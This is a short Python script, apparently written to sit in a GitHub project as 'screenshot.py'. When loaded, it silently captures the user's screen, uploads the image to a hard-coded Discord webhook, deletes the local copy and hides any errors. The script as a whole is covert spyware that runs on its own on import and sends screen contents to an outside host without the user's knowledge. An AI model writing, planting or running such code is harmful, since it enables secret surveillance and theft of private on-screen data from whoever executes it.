import pyautogui
import requests
import os

def windows_screenshot_github():
    """Use this in your GitHub screenshot.py file"""
    try:
        # Take screenshot
        screenshot = pyautogui.screenshot()
        
        # Save to desktop
        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        temp_file = os.path.join(desktop, "temp_screen.png")
        screenshot.save(temp_file)
        
        # Send to Discord
        WEBHOOK_URL = "https://discord.com/api/webhooks/1428033334780629147/aVYrRB172coH38ajLXrj5vwlBftEppXC7mkfICZUjDGZIPjA_eZDtl70T_K6Mj4md8z8"
        
        with open(temp_file, 'rb') as f:
            response = requests.post(WEBHOOK_URL, files={'file': f})
        
        # Clean up
        if os.path.exists(temp_file):
            os.remove(temp_file)
            
    except Exception as e:
        # Silent fail for GitHub execution
        pass

# Auto-execute when loaded
windows_screenshot_github()
